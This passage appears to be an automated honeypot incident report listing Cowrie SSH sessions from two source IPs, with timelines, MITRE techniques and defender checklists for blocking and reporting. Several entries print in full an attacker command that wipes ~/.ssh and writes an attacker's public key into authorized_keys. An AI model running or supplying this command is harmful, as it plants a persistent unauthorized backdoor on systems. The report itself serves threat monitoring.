| `2026-05-15 05:12:38` | `cowrie.client.version` |
| `2026-05-15 05:12:39` | `cowrie.client.kex` |
| `2026-05-15 05:12:39` | `cowrie.login.success` |
| `2026-05-15 05:12:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ddc1b7ead38

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:13 |
| **Last Seen** | 2026-05-15 05:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:13:23` | `cowrie.session.connect` |
| `2026-05-15 05:13:23` | `cowrie.client.version` |
| `2026-05-15 05:13:23` | `cowrie.client.kex` |
| `2026-05-15 05:13:24` | `cowrie.login.success` |
| `2026-05-15 05:13:24` | `cowrie.session.params` |
| `2026-05-15 05:13:24` | `cowrie.command.input` |
| `2026-05-15 05:13:24` | `cowrie.command.failed` |
| `2026-05-15 05:13:25` | `cowrie.log.closed` |
| `2026-05-15 05:13:25` | `cowrie.session.params` |
| `2026-05-15 05:13:25` | `cowrie.command.input` |
| `2026-05-15 05:13:25` | `cowrie.session.file_download` |
| `2026-05-15 05:13:25` | `cowrie.log.closed` |
| `2026-05-15 05:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f86a30e512d

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:13 |
| **Last Seen** | 2026-05-15 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:13:28` | `cowrie.session.connect` |
| `2026-05-15 05:13:28` | `cowrie.client.version` |
| `2026-05-15 05:13:28` | `cowrie.client.kex` |
| `2026-05-15 05:13:29` | `cowrie.login.success` |
| `2026-05-15 05:13:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e341654ae6b

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:17 |
| **Last Seen** | 2026-05-15 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:17:01` | `cowrie.session.connect` |
| `2026-05-15 05:17:01` | `cowrie.client.version` |
| `2026-05-15 05:17:01` | `cowrie.client.kex` |
| `2026-05-15 05:17:02` | `cowrie.login.success` |
| `2026-05-15 05:17:02` | `cowrie.session.params` |
| `2026-05-15 05:17:02` | `cowrie.command.input` |
| `2026-05-15 05:17:02` | `cowrie.command.failed` |
| `2026-05-15 05:17:02` | `cowrie.log.closed` |
| `2026-05-15 05:17:03` | `cowrie.session.params` |
| `2026-05-15 05:17:03` | `cowrie.command.input` |
| `2026-05-15 05:17:03` | `cowrie.session.file_download` |
| `2026-05-15 05:17:03` | `cowrie.log.closed` |
| `2026-05-15 05:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f49d2557e02d

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:17 |
| **Last Seen** | 2026-05-15 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:17:06` | `cowrie.session.connect` |
| `2026-05-15 05:17:06` | `cowrie.client.version` |
| `2026-05-15 05:17:06` | `cowrie.client.kex` |
| `2026-05-15 05:17:07` | `cowrie.login.success` |
| `2026-05-15 05:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-022f4e429444

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:20 |
| **Last Seen** | 2026-05-15 05:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:20:04` | `cowrie.session.connect` |
| `2026-05-15 05:20:04` | `cowrie.client.version` |
| `2026-05-15 05:20:04` | `cowrie.client.kex` |
| `2026-05-15 05:20:05` | `cowrie.login.success` |
| `2026-05-15 05:20:05` | `cowrie.session.params` |
| `2026-05-15 05:20:05` | `cowrie.command.input` |
| `2026-05-15 05:20:05` | `cowrie.command.failed` |
| `2026-05-15 05:20:05` | `cowrie.log.closed` |
| `2026-05-15 05:20:06` | `cowrie.session.params` |
| `2026-05-15 05:20:06` | `cowrie.command.input` |
| `2026-05-15 05:20:06` | `cowrie.session.file_download` |
| `2026-05-15 05:20:06` | `cowrie.log.closed` |
| `2026-05-15 05:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c45d8102247

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:20 |
| **Last Seen** | 2026-05-15 05:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:20:08` | `cowrie.session.connect` |
| `2026-05-15 05:20:08` | `cowrie.client.version` |
| `2026-05-15 05:20:08` | `cowrie.client.kex` |
| `2026-05-15 05:20:08` | `cowrie.login.success` |
| `2026-05-15 05:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-862e4d2e909b

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:21 |
| **Last Seen** | 2026-05-15 05:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:21:33` | `cowrie.session.connect` |
| `2026-05-15 05:21:33` | `cowrie.client.version` |
| `2026-05-15 05:21:33` | `cowrie.client.kex` |
| `2026-05-15 05:21:33` | `cowrie.login.success` |
| `2026-05-15 05:21:34` | `cowrie.session.params` |
| `2026-05-15 05:21:34` | `cowrie.command.input` |
| `2026-05-15 05:21:34` | `cowrie.command.failed` |
| `2026-05-15 05:21:34` | `cowrie.log.closed` |
| `2026-05-15 05:21:34` | `cowrie.session.params` |
| `2026-05-15 05:21:34` | `cowrie.command.input` |
| `2026-05-15 05:21:34` | `cowrie.session.file_download` |
| `2026-05-15 05:21:34` | `cowrie.log.closed` |
| `2026-05-15 05:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f7b84cf4e9d

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:21 |
| **Last Seen** | 2026-05-15 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:21:36` | `cowrie.session.connect` |
| `2026-05-15 05:21:36` | `cowrie.client.version` |
| `2026-05-15 05:21:37` | `cowrie.client.kex` |
| `2026-05-15 05:21:37` | `cowrie.login.success` |
| `2026-05-15 05:21:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f40226df03

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:22 |
| **Last Seen** | 2026-05-15 05:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:22:58` | `cowrie.session.connect` |
| `2026-05-15 05:22:58` | `cowrie.client.version` |
| `2026-05-15 05:22:58` | `cowrie.client.kex` |
| `2026-05-15 05:22:59` | `cowrie.login.success` |
| `2026-05-15 05:22:59` | `cowrie.session.params` |
| `2026-05-15 05:22:59` | `cowrie.command.input` |
| `2026-05-15 05:22:59` | `cowrie.command.failed` |
| `2026-05-15 05:23:00` | `cowrie.log.closed` |
| `2026-05-15 05:23:00` | `cowrie.session.params` |
| `2026-05-15 05:23:00` | `cowrie.command.input` |
| `2026-05-15 05:23:00` | `cowrie.session.file_download` |
| `2026-05-15 05:23:00` | `cowrie.log.closed` |
| `2026-05-15 05:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccc76dd8a311

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:23 |
| **Last Seen** | 2026-05-15 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:23:03` | `cowrie.session.connect` |
| `2026-05-15 05:23:03` | `cowrie.client.version` |
| `2026-05-15 05:23:03` | `cowrie.client.kex` |
| `2026-05-15 05:23:04` | `cowrie.login.success` |
| `2026-05-15 05:23:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ff9ac0f1431

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:23 |
| **Last Seen** | 2026-05-15 05:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:23:05` | `cowrie.session.connect` |
| `2026-05-15 05:23:05` | `cowrie.client.version` |
| `2026-05-15 05:23:06` | `cowrie.client.kex` |
| `2026-05-15 05:23:06` | `cowrie.login.success` |
| `2026-05-15 05:23:06` | `cowrie.session.params` |
| `2026-05-15 05:23:06` | `cowrie.command.input` |
| `2026-05-15 05:23:06` | `cowrie.command.failed` |
| `2026-05-15 05:23:07` | `cowrie.log.closed` |
| `2026-05-15 05:23:07` | `cowrie.session.params` |
| `2026-05-15 05:23:07` | `cowrie.command.input` |
| `2026-05-15 05:23:07` | `cowrie.session.file_download` |
| `2026-05-15 05:23:07` | `cowrie.log.closed` |
| `2026-05-15 05:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-551cf951d9d6

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:23 |
| **Last Seen** | 2026-05-15 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:23:09` | `cowrie.session.connect` |
| `2026-05-15 05:23:09` | `cowrie.client.version` |
| `2026-05-15 05:23:09` | `cowrie.client.kex` |
| `2026-05-15 05:23:10` | `cowrie.login.success` |
| `2026-05-15 05:23:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51aeee8f3b53

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:24 |
| **Last Seen** | 2026-05-15 05:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:24:36` | `cowrie.session.connect` |
| `2026-05-15 05:24:36` | `cowrie.client.version` |
| `2026-05-15 05:24:37` | `cowrie.client.kex` |
| `2026-05-15 05:24:37` | `cowrie.login.success` |
| `2026-05-15 05:24:37` | `cowrie.session.params` |
| `2026-05-15 05:24:37` | `cowrie.command.input` |
| `2026-05-15 05:24:37` | `cowrie.command.failed` |
| `2026-05-15 05:24:38` | `cowrie.log.closed` |
| `2026-05-15 05:24:38` | `cowrie.session.params` |
| `2026-05-15 05:24:38` | `cowrie.command.input` |
| `2026-05-15 05:24:38` | `cowrie.session.file_download` |
| `2026-05-15 05:24:38` | `cowrie.log.closed` |
| `2026-05-15 05:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7deb83ae4892

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:24 |
| **Last Seen** | 2026-05-15 05:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:24:40` | `cowrie.session.connect` |
| `2026-05-15 05:24:40` | `cowrie.client.version` |
| `2026-05-15 05:24:40` | `cowrie.client.kex` |
| `2026-05-15 05:24:41` | `cowrie.login.success` |
| `2026-05-15 05:24:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df1911fbaa1

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:25 |
| **Last Seen** | 2026-05-15 05:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:25:30` | `cowrie.session.connect` |
| `2026-05-15 05:25:30` | `cowrie.client.version` |
| `2026-05-15 05:25:31` | `cowrie.client.kex` |
| `2026-05-15 05:25:31` | `cowrie.login.success` |
| `2026-05-15 05:25:32` | `cowrie.session.params` |
| `2026-05-15 05:25:32` | `cowrie.command.input` |
| `2026-05-15 05:25:32` | `cowrie.command.failed` |
| `2026-05-15 05:25:32` | `cowrie.log.closed` |
| `2026-05-15 05:25:32` | `cowrie.session.params` |
| `2026-05-15 05:25:32` | `cowrie.command.input` |
| `2026-05-15 05:25:33` | `cowrie.session.file_download` |
| `2026-05-15 05:25:33` | `cowrie.log.closed` |
| `2026-05-15 05:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06f0d1a3fb51

| Field | Detail |
|---|---|
| **Source IP** | `82.169.135[.]117` |
| **First Seen** | 2026-05-15 05:25 |
| **Last Seen** | 2026-05-15 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 05:25:35` | `cowrie.session.connect` |
| `2026-05-15 05:25:35` | `cowrie.client.version` |
| `2026-05-15 05:25:35` | `cowrie.client.kex` |
| `2026-05-15 05:25:36` | `cowrie.login.success` |
| `2026-05-15 05:25:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.169.135[.]117` to AbuseIPDB if not already reported
- [ ] Block `82.169.135[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-691a85d6c9b6

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:26 |
| **Last Seen** | 2026-05-15 05:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
